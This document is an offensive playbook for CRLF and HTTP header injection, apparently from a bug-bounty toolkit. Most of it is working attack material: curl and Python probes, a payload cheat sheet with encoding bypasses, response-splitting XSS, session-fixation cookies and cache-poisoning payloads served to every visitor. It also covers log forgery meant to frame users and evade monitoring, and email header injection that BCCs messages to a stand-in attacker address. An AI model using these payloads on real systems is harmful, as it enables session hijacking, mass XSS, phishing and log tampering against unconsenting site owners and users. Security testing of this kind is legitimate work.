# Playbook: CRLF Injection, HTTP Header Injection & Response Splitting

## Purpose
Detect and exploit CRLF injection (\r\n) in HTTP headers to achieve response
splitting, header injection, session fixation, cache poisoning, XSS, and log
forging. Covers email header injection via web forms as well.
Input: URL list with parameters reflected in response headers, redirect
endpoints, or any parameter echoed in Set-Cookie/Location/custom headers.

---

## Theory

HTTP headers are delimited by CRLF sequences (\r\n = %0d%0a). If user input
is injected into a response header without sanitizing CR/LF characters, an
attacker can:

1. **Header Injection** -- inject arbitrary response headers (Set-Cookie,
   Location, Content-Type, X-Forwarded-For, etc.)
2. **Response Splitting** -- inject a full second HTTP response by terminating
   headers with \r\n\r\n and providing a new response body
3. **Log Injection** -- forge log entries by injecting CRLF into logged values
4. **Email Header Injection** -- inject CC/BCC/Subject headers via SMTP through
   web form inputs

The root cause is always the same: unsanitized \r\n in user-controlled data
that ends up in a header context (HTTP, SMTP, or log line).

---

## Step 1 -- Identify Injection Points

```bash
# Find parameters reflected in response headers
# Focus on: redirect URLs, language/locale params, cookie values, filename params

# Check which params appear in response headers
TARGET="https://TARGET"
PARAMS=(url redirect return_to next goto dest lang locale callback filename)

for param in "${PARAMS[@]}"; do
  CANARY="crlftest$(date +%s)"
  headers=$(curl -sk -D - -o /dev/null "${TARGET}/?${param}=${CANARY}")
  if echo "$headers" | grep -qi "$CANARY"; then
    echo "[REFLECTED IN HEADER] param=${param}"
    echo "$headers" | grep -i "$CANARY"
  fi
done

# Check Location header reflection (redirects)
curl -sk -D - -o /dev/null "${TARGET}/redirect?url=https://example.com" | grep -i "^location:"

# Check Set-Cookie reflection
curl -sk -D - -o /dev/null "${TARGET}/setlang?lang=en" | grep -i "^set-cookie:"

# From wayback/gau output -- find redirect-like params
grep -iE "[?&](url|redirect|return|next|goto|dest|forward|continue|rurl|return_to|redirect_uri|callback)=" \
  urls_all.txt | sort -u > crlf_candidates.txt
```

---

## Step 2 -- Basic CRLF Injection Probes

```bash
ENDPOINT="https://TARGET/redirect"
PARAM="url"

# Probe 1 -- basic %0d%0a
curl -sk -D - -o /dev/null \
  "${ENDPOINT}?${PARAM}=http://example.com%0d%0aX-Injected:true"
# Look for "X-Injected: true" in response headers

# Probe 2 -- uppercase encoding
curl -sk -D - -o /dev/null \
  "${ENDPOINT}?${PARAM}=http://example.com%0D%0AX-Injected:true"

# Probe 3 -- just LF (some servers accept \n alone)
curl -sk -D - -o /dev/null \
  "${ENDPOINT}?${PARAM}=http://example.com%0AX-Injected:true"

# Probe 4 -- just CR
curl -sk -D - -o /dev/null \
  "${ENDPOINT}?${PARAM}=http://example.com%0DX-Injected:true"

# Quick validation script
python3 -c "
import requests, urllib3
urllib3.disable_warnings()
url = '${ENDPOINT}'
param = '${PARAM}'
payloads = [
    'http://example.com%0d%0aX-Injected:%20true',
    'http://example.com%0D%0AX-Injected:%20true',
    'http://example.com%0AX-Injected:%20true',
    'http://example.com%0DX-Injected:%20true',
]
for p in payloads:
    r = requests.get(url, params={param: p}, allow_redirects=False, verify=False)
    if 'x-injected' in str(r.headers).lower():
        print(f'[VULNERABLE] {p}')
        for k, v in r.headers.items():
            print(f'  {k}: {v}')
"
```

---

## Step 3 -- CRLF Payload Arsenal

### Standard Payloads

```bash
CRLF_PAYLOADS=(
  # Basic CRLF
  "%0d%0aX-Injected:true"
  "%0D%0AX-Injected:true"

  # LF only (works on some servers)
  "%0aX-Injected:true"
  "%0AX-Injected:true"

  # CR only
  "%0dX-Injected:true"
  "%0DX-Injected:true"

  # Double encoding
  "%250d%250aX-Injected:true"
  "%25%30%64%25%30%61X-Injected:true"

  # Triple encoding
  "%25250d%25250aX-Injected:true"

  # Unicode CRLF (UTF-8 encoded)
  "%E5%98%8A%E5%98%8DX-Injected:true"

  # Unicode variants
  "%C4%8D%C4%8AX-Injected:true"

  # Null byte prefix
  "%00%0d%0aX-Injected:true"
  "%00%0D%0AX-Injected:true"

  # Tab + CRLF
  "%09%0d%0aX-Injected:true"

  # Space + CRLF
  "%20%0d%0aX-Injected:true"

  # Backslash literal
  "\\r\\nX-Injected:true"

  # Mixed encoding
  "%0d%0a%20X-Injected:true"
  "\r\nX-Injected:true"
)

# Run all payloads against target
ENDPOINT="https://TARGET/redirect?url="
for payload in "${CRLF_PAYLOADS[@]}"; do
  result=$(curl -sk -D - -o /dev/null "${ENDPOINT}${payload}" 2>&1)
  if echo "$result" | grep -qi "X-Injected"; then
    echo "[HIT] $payload"
    echo "$result" | head -20
    echo "---"
  fi
done
```

### Unicode CRLF Detail

```
%E5%98%8A = U+560A (decoded by some parsers as \n)
%E5%98%8D = U+560D (decoded by some parsers as \r)

These bypass filters that only check for %0d%0a but not Unicode equivalents.
Seen in Nginx, older Apache, and some Java/Python frameworks.
```

---

## Step 4 -- Response Splitting (Full Body Injection)

```bash
# Inject a complete second response by terminating headers with double CRLF
# The double \r\n\r\n marks end of headers, start of body

# XSS via response splitting
SPLIT_PAYLOAD="%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html><script>alert(document.domain)</script></html>"
curl -sk -D - "${ENDPOINT}?${PARAM}=${SPLIT_PAYLOAD}"

# HTML injection via response splitting
SPLIT_PAYLOAD="%0d%0a%0d%0a<html><body><h1>Response%20Split%20PoC</h1></body></html>"
curl -sk -D - "${ENDPOINT}?${PARAM}=${SPLIT_PAYLOAD}"

# Full HTTP response injection (for proxy/cache poisoning)
# Inject: HTTP/1.1 200 OK + headers + body
SPLIT_PAYLOAD="%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2050%0d%0a%0d%0a<html><script>alert('split')</script></html>"
curl -sk -D - "${ENDPOINT}?${PARAM}=${SPLIT_PAYLOAD}"

# Python script for cleaner response splitting test
python3 << 'PYEOF'
import requests, urllib3, urllib.parse
urllib3.disable_warnings()

target = "https://TARGET/redirect"
param = "url"

# Build split payload
injected_headers = "\r\nContent-Type: text/html\r\n\r\n"
injected_body = "<html><script>alert(document.domain)</script></html>"
payload = "http://example.com" + injected_headers + injected_body

# Send raw (requests may normalize, use urllib3 or socket for precision)
encoded = urllib.parse.quote(payload, safe='')
r = requests.get(f"{target}?{param}={encoded}", allow_redirects=False, verify=False)
print(f"Status: {r.status_code}")
print(f"Headers: {dict(r.headers)}")
print(f"Body preview: {r.text[:200]}")

if "alert(document.domain)" in r.text:
    print("[VULNERABLE] Response splitting with XSS confirmed")
PYEOF
```

---

## Step 5 -- Header Injection Attacks

### 5a -- Set-Cookie Injection (Session Fixation)

```bash
# Inject a Set-Cookie header to fix the victim's session
PAYLOAD="%0d%0aSet-Cookie:%20session=attacker_controlled_value"
curl -sk -D - -o /dev/null "${ENDPOINT}?${PARAM}=${PAYLOAD}"

# With path and domain for broader scope
PAYLOAD="%0d%0aSet-Cookie:%20session=evil;%20Path=/;%20Domain=.target.com"
curl -sk -D - -o /dev/null "${ENDPOINT}?${PARAM}=${PAYLOAD}"

# HttpOnly bypass -- inject a non-HttpOnly copy of the session cookie
PAYLOAD="%0d%0aSet-Cookie:%20stolen=1;%20Path=/"
curl -sk -D - -o /dev/null "${ENDPOINT}?${PARAM}=${PAYLOAD}"

# Attack flow:
# 1. Attacker crafts URL: https://target.com/redirect?url=X%0d%0aSet-Cookie:%20session=KNOWN_VALUE
# 2. Victim clicks the link
# 3. Victim's browser sets session=KNOWN_VALUE
# 4. Victim logs in (session ID remains KNOWN_VALUE if server does not regenerate)
# 5. Attacker uses session=KNOWN_VALUE to hijack the authenticated session
```

### 5b -- X-Forwarded-For / Host Header Poisoning

```bash
# Inject X-Forwarded-For to bypass IP-based access controls
curl -sk -D - "${ENDPOINT}?${PARAM}=value%0d%0aX-Forwarded-For:%20127.0.0.1"

# Inject Host header (may affect virtual host routing)
curl -sk -D - "${ENDPOINT}?${PARAM}=value%0d%0aHost:%20evil.com"

# X-Forwarded-Host for cache key poisoning
curl -sk -D - "${ENDPOINT}?${PARAM}=value%0d%0aX-Forwarded-Host:%20evil.com"

# These are especially impactful when:
# - App uses X-Forwarded-For for auth decisions or rate limiting
# - App generates absolute URLs based on Host header (password reset links)
# - Reverse proxy trusts injected headers for routing
```

### 5c -- Location Header Manipulation (Open Redirect)

```bash
# Override or inject a second Location header
PAYLOAD="%0d%0aLocation:%20https://evil.com/phish"
curl -sk -D - -o /dev/null "${ENDPOINT}?${PARAM}=${PAYLOAD}"

# If the app already sets a Location header, inject a second one
# Some clients follow the last Location header, some the first
PAYLOAD="https://legitimate.com%0d%0aLocation:%20https://evil.com"
curl -sk -D - -o /dev/null "${ENDPOINT}?${PARAM}=${PAYLOAD}"

# Combined with response splitting for guaranteed redirect
PAYLOAD="%0d%0a%0d%0a%0d%0aHTTP/1.1%20302%20Found%0d%0aLocation:%20https://evil.com%0d%0a%0d%0a"
curl -sk -D - "${ENDPOINT}?${PARAM}=${PAYLOAD}"
```

### 5d -- Content-Type Header Override

```bash
# Force the browser to interpret response as HTML (for XSS)
PAYLOAD="%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>"
curl -sk -D - "${ENDPOINT}?${PARAM}=${PAYLOAD}"

# Force JSON interpretation
PAYLOAD="%0d%0aContent-Type:%20application/json%0d%0a%0d%0a{\"admin\":true}"
curl -sk -D - "${ENDPOINT}?${PARAM}=${PAYLOAD}"

# Override Content-Disposition for file download attacks
PAYLOAD="%0d%0aContent-Disposition:%20attachment;%20filename=malware.exe"
curl -sk -D - "${ENDPOINT}?${PARAM}=${PAYLOAD}"
```

---

## Step 6 -- Email Header Injection (SMTP via Web Forms)

```bash
# Many web forms (contact, registration, password reset) pass user input
# into email headers. If \r\n is not stripped, attacker injects SMTP headers.

# Test contact form with CC injection
curl -sk -X POST "https://TARGET/contact" \
  -d "name=test&email=attacker@evil.com%0d%0aCc:victim2@target.com&message=test"

# BCC injection (silent copy)
curl -sk -X POST "https://TARGET/contact" \
  -d "name=test&email=attacker@evil.com%0d%0aBcc:victim@target.com&message=test"

# Subject manipulation
curl -sk -X POST "https://TARGET/contact" \
  -d "name=test&email=attacker@evil.com%0d%0aSubject:Urgent%20Password%20Reset&message=test"

# Full body injection (inject a second email body)
curl -sk -X POST "https://TARGET/contact" \
  -d "name=test&email=attacker@evil.com%0d%0a%0d%0aInjected email body with phishing link&message=test"

# Content-Type injection for HTML email
curl -sk -X POST "https://TARGET/contact" \
  -d "name=test&email=attacker@evil.com%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<h1>Phishing</h1>&message=test"

# Python script for thorough email header injection test
python3 << 'PYEOF'
import requests, urllib3
urllib3.disable_warnings()

target = "https://TARGET/contact"
base_email = "test@test.com"

# Payloads to test in the email field
injections = {
    "CC":      f"{base_email}\r\nCc: spy@evil.com",
    "BCC":     f"{base_email}\r\nBcc: spy@evil.com",
    "Subject": f"{base_email}\r\nSubject: Hijacked Subject",
    "To":      f"{base_email}\r\nTo: extra@evil.com",
    "Body":    f"{base_email}\r\n\r\nInjected body content",
}

for name, payload in injections.items():
    r = requests.post(target, data={
        "name": "test",
        "email": payload,
        "message": "test"
    }, verify=False)
    print(f"[{name}] Status: {r.status_code} | Length: {len(r.text)}")
    # Success indicators: different response, no error about invalid email,
    # or confirmation that email was sent
PYEOF
```

---

## Step 7 -- Log Injection (CRLF in Log Entries)

```bash
# If user input is written to log files, CRLF can forge log entries
# This can evade SIEM detection, frame other users, or hide attacks

# Inject fake log entry via User-Agent
curl -sk "https://TARGET/" \
  -H "User-Agent: Mozilla/5.0%0d%0a127.0.0.1 - admin [14/Apr/2026:10:00:00] \"GET /admin HTTP/1.1\" 200 1234"

# Inject via Referer header
curl -sk "https://TARGET/" \
  -H "Referer: https://google.com%0d%0a[INFO] User admin logged in successfully"

# Inject via query parameter (if logged)
curl -sk "https://TARGET/search?q=test%0d%0a[ERROR]%20Authentication%20failed%20for%20user%20admin%20from%2010.0.0.1"

# Inject via X-Forwarded-For (commonly logged)
curl -sk "https://TARGET/" \
  -H "X-Forwarded-For: 1.2.3.4%0d%0a192.168.1.1 - - [14/Apr/2026:10:00:00] \"DELETE /api/users HTTP/1.1\" 200"

# Impact scenarios:
# 1. Frame another IP for malicious activity
# 2. Hide attack logs by injecting benign entries around them
# 3. Inject fake "successful login" entries to confuse incident response
# 4. Trigger false alerts in SIEM to cause alert fatigue
# 5. Inject ANSI escape sequences to attack terminal-based log viewers
#    Example: %1b[2J clears terminal screen when admin cats the log

# ANSI escape injection (terminal attack)
curl -sk "https://TARGET/search?q=%1b%5B2J%1b%5B1;31mHACKED%1b%5B0m"
```

---

## Step 8 -- Cache Poisoning via Header Injection

```bash
# If target is behind a CDN/reverse proxy (Cloudflare, Varnish, Nginx cache),
# CRLF injection can poison cached responses served to other users.

# Step 1: Identify caching behavior
curl -sk -D - "https://TARGET/page" | grep -iE "(x-cache|cf-cache|age:|via:|x-varnish|x-proxy)"

# Step 2: Inject malicious content that gets cached
# The cache key is typically the URL path. If CRLF lets you inject a body,
# that body gets cached and served to all subsequent visitors.

# Poison with XSS
PAYLOAD="%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2060%0d%0a%0d%0a<script>alert(document.domain)</script>"
curl -sk -D - "https://TARGET/redirect?url=${PAYLOAD}"

# Verify poison by requesting the same URL without payload
curl -sk -D - "https://TARGET/redirect?url=${PAYLOAD}" | grep "alert"

# Poison via X-Forwarded-Host (if cache key ignores this header)
curl -sk -D - "https://TARGET/" \
  -H "X-Forwarded-Host: evil.com%0d%0aX-Injected: poisoned"

# Cache poisoning is Critical severity because:
# - Affects ALL users who visit the cached page
# - Persists until cache TTL expires or is manually purged
# - Can deliver XSS, phishing, or malware to every visitor
# - One request can compromise thousands of users

# Cache deception variant:
# If CRLF lets you override Cache-Control headers
PAYLOAD="%0d%0aCache-Control:%20public,%20max-age=31536000"
curl -sk -D - "${ENDPOINT}?${PARAM}=${PAYLOAD}"
# Forces caching of a response that should not be cached (e.g., authenticated content)
```

---

## Step 9 -- Bypass Techniques

When basic %0d%0a is filtered:

```bash
# Double URL encoding
# %0d = %250d, %0a = %250a (server decodes twice)
curl -sk -D - "${ENDPOINT}?${PARAM}=test%250d%250aX-Injected:true"

# Triple encoding
curl -sk -D - "${ENDPOINT}?${PARAM}=test%25250d%25250aX-Injected:true"

# Unicode normalization bypass
# Some servers normalize Unicode before processing
curl -sk -D - "${ENDPOINT}?${PARAM}=test%E5%98%8A%E5%98%8DX-Injected:true"
curl -sk -D - "${ENDPOINT}?${PARAM}=test%C4%8D%C4%8AX-Injected:true"

# Null byte prefix (terminates string in C-based parsers, rest passes through)
curl -sk -D - "${ENDPOINT}?${PARAM}=test%00%0d%0aX-Injected:true"

# Tab before CRLF
curl -sk -D - "${ENDPOINT}?${PARAM}=test%09%0d%0aX-Injected:true"

# Vertical tab / form feed
curl -sk -D - "${ENDPOINT}?${PARAM}=test%0b%0d%0aX-Injected:true"
curl -sk -D - "${ENDPOINT}?${PARAM}=test%0c%0d%0aX-Injected:true"

# Mixed case encoding
curl -sk -D - "${ENDPOINT}?${PARAM}=test%0D%0aX-Injected:true"
curl -sk -D - "${ENDPOINT}?${PARAM}=test%0d%0AX-Injected:true"

# Line separator / paragraph separator (Unicode)
# U+2028 (line separator) = %E2%80%A8
# U+2029 (paragraph separator) = %E2%80%A9
curl -sk -D - "${ENDPOINT}?${PARAM}=test%E2%80%A8X-Injected:true"
curl -sk -D - "${ENDPOINT}?${PARAM}=test%E2%80%A9X-Injected:true"

# Backslash-r backslash-n literal (if server interprets escape sequences)
curl -sk -D - "${ENDPOINT}?${PARAM}=test\\r\\nX-Injected:true"

# UTF-16 encoding (in JSON/XML contexts)
# \u000d\u000a
curl -sk -X POST "${ENDPOINT}" \
  -H "Content-Type: application/json" \
  -d "{\"${PARAM}\": \"test\\u000d\\u000aX-Injected: true\"}"
```

---

## Step 10 -- Framework-Specific Vulnerabilities

### PHP -- header() function

```php
// VULNERABLE: user input directly in header()
header("Location: " . $_GET['url']);
// Payload: ?url=http://example.com%0d%0aSet-Cookie:%20evil=1

// PHP >= 5.1.2 splits on \r\n in header() and raises a warning
// PHP >= 7.0 blocks header() calls containing \r or \n by default
// But older versions and custom header functions may still be vulnerable

// ALSO CHECK: setcookie() with user-controlled values
setcookie("lang", $_GET['lang']);
// If lang contains %0d%0a, some PHP versions allow injection
```

```bash
# Test PHP targets
curl -sk -D - "https://TARGET/redirect.php?url=http://x%0d%0aSet-Cookie:evil=1"
curl -sk -D - "https://TARGET/setlang.php?lang=en%0d%0aX-Injected:true"
```

### Python Flask -- redirect() and make_response()

```python
# VULNERABLE: direct header assignment with user input
from flask import redirect, request, make_response

@app.route('/redir')
def redir():
    url = request.args.get('url')
    return redirect(url)  # Werkzeug >= 2.1 strips \r\n, older versions vulnerable

@app.route('/setcookie')
def setcookie():
    resp = make_response("ok")
    resp.headers['X-Custom'] = request.args.get('val')  # Vulnerable if unchecked
    return resp
```

```bash
# Test Flask targets
curl -sk -D - "https://TARGET/redir?url=http://x%0d%0aX-Injected:true"
curl -sk -D - "https://TARGET/setcookie?val=test%0d%0aX-Injected:true"
```

### Node.js -- setHeader() and writeHead()

```javascript
// VULNERABLE (Node < 11.x): user input in setHeader
res.setHeader('Location', req.query.url);
// Node >= 11.x throws ERR_INVALID_CHAR if header value contains \r or \n

// VULNERABLE: writeHead with user-controlled values
res.writeHead(302, { 'Location': req.query.url });

// Express redirect (delegates to setHeader internally)
res.redirect(req.query.url);
```

```bash
# Test Node.js targets
curl -sk -D - "https://TARGET/redirect?url=http://x%0d%0aSet-Cookie:evil=1"

# Node.js specific: check for header array injection
# Some Node versions allow array values in headers
curl -sk -D - "https://TARGET/api" \
  -H "X-Custom: value1" -H "X-Custom: %0d%0aInjected: true"
```

### Java -- response.setHeader() / response.addHeader()

```java
// VULNERABLE (old Servlet containers, Tomcat < 6.0.24):
response.setHeader("Location", request.getParameter("url"));
response.addHeader("Set-Cookie", "lang=" + request.getParameter("lang"));

// Modern Servlet containers (Tomcat >= 6.0.24, Jetty >= 9.x) reject
// header values containing \r or \n. But custom HTTP libraries may not.
```

```bash
# Test Java targets (especially older Tomcat/Jetty)
curl -sk -D - "https://TARGET/redirect?url=http://x%0d%0aSet-Cookie:evil=1"

# Spring Boot specific
curl -sk -D - "https://TARGET/api/redirect?url=http://x%0d%0aX-Injected:true"
```

### Go -- net/http

```go
// Go's net/http sanitizes \r and \n in header values since Go 1.7
// w.Header().Set("Location", userInput) is safe in modern Go
// But raw response writing is still vulnerable:
fmt.Fprintf(w, "HTTP/1.1 302 Found\r\nLocation: %s\r\n\r\n", userInput)
```

### Ruby on Rails

```bash
# Rails >= 5.0 strips \r\n from header values
# Older Rails versions may be vulnerable
curl -sk -D - "https://TARGET/redirect?url=http://x%0d%0aX-Injected:true"
```

---

## Step 11 -- Automated Scanning

### CRLFuzz

```bash
# Install
go install github.com/dwisiswant0/crlfuzz/cmd/crlfuzz@latest

# Single URL
crlfuzz -u "https://TARGET/redirect?url=test"

# From URL list
crlfuzz -l urls_redirect.txt -o crlf_results.txt

# With concurrency
crlfuzz -l urls_redirect.txt -c 50 -o crlf_results.txt

# Silent mode (only vulnerable URLs)
crlfuzz -l urls_redirect.txt -s -o crlf_vulnerable.txt
```

### crlfmap

```bash
# Install
go install github.com/nicholasgasior/crlfmap@latest

# Basic scan
crlfmap -u "https://TARGET/redirect?url=test"

# Bulk scan from file
cat redirect_urls.txt | crlfmap
```

### Custom Curl Scanner

```bash
#!/bin/bash
# crlf_scan.sh -- batch CRLF scanner
INPUT_FILE="${1:-crlf_candidates.txt}"
OUTPUT_FILE="crlf_findings.txt"
> "$OUTPUT_FILE"

PAYLOADS=(
  "%0d%0aX-CRLF-Test:true"
  "%0D%0AX-CRLF-Test:true"
  "%0aX-CRLF-Test:true"
  "%250d%250aX-CRLF-Test:true"
  "%E5%98%8A%E5%98%8DX-CRLF-Test:true"
  "%00%0d%0aX-CRLF-Test:true"
  "%0d%0a%20X-CRLF-Test:true"
)

while IFS= read -r url; do
  for payload in "${PAYLOADS[@]}"; do
    test_url="${url}${payload}"
    response_headers=$(curl -sk -D - -o /dev/null --max-time 10 "$test_url" 2>/dev/null)
    if echo "$response_headers" | grep -qi "X-CRLF-Test"; then
      echo "[VULNERABLE] ${url} | Payload: ${payload}" | tee -a "$OUTPUT_FILE"
      break  # one hit is enough per URL
    fi
  done
done < "$INPUT_FILE"

echo "Results: $OUTPUT_FILE"
echo "Vulnerable: $(wc -l < "$OUTPUT_FILE")"
```

### Nuclei Templates

```bash
# CRLF injection templates
nuclei -u "https://TARGET/" -t crlf/ -silent
nuclei -l urls.txt -t crlf/ -c 50 -o nuclei_crlf.txt

# Specific template
nuclei -u "https://TARGET/redirect?url=test" -t crlf/crlf-injection.yaml
```

---

## Output

```
PLAYBOOK  : CRLF Injection / Header Injection / Response Splitting
TARGET    : https://target.com/redirect?url=
-------------------------------------------------------------
STEP 1    : Identify injection points
STATUS    : DONE
RESULT    : Parameter "url" reflected in Location header

STEP 2    : Basic CRLF probe
STATUS    : DONE
RESULT    : %0d%0a injected arbitrary header (X-Injected: true confirmed)

STEP 3    : Attack escalation
STATUS    : DONE
RESULT    : Set-Cookie injection confirmed (session fixation possible)
            Response splitting with XSS confirmed via Content-Type override
-------------------------------------------------------------
FINDINGS SUMMARY
  [HIGH]     CRLF injection in Location header via url parameter
             Set-Cookie injection enables session fixation
  [HIGH]     Response splitting allows XSS delivery
  [MEDIUM]   Cache poisoning possible (X-Cache: HIT observed)
  [LOW]      Log injection via User-Agent header
-------------------------------------------------------------
SEVERITY  : HIGH (P2) -- escalates to CRITICAL if cache poisoning confirmed
IMPACT    : Session fixation, XSS via response splitting, cache poisoning
EVIDENCE  : [curl command + response headers showing injected header]
NEXT STEPS
  1. Test cache poisoning persistence (request without payload, check if XSS cached)
  2. Test email header injection on contact/registration forms
  3. Load 03_reporting/report_writer.md -- write report with full PoC chain
  4. If cache poisoning confirmed, escalate to P1/Critical immediately
```

---

## Quick Reference -- Payload Cheat Sheet

```
Basic:          %0d%0aHeader:value
Uppercase:      %0D%0AHeader:value
LF only:        %0aHeader:value
CR only:        %0dHeader:value
Double encode:  %250d%250aHeader:value
Triple encode:  %25250d%25250aHeader:value
Unicode CRLF:   %E5%98%8A%E5%98%8DHeader:value
Null prefix:    %00%0d%0aHeader:value
UTF-16 (JSON):  \u000d\u000aHeader:value
Line separator: %E2%80%A8Header:value
Response split: %0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>
Session fix:    %0d%0aSet-Cookie:%20session=evil
Email CC:       victim@test.com%0d%0aCc:spy@evil.com
Email BCC:      victim@test.com%0d%0aBcc:spy@evil.com
Log forge:      test%0d%0a[INFO]%20Fake%20log%20entry
```
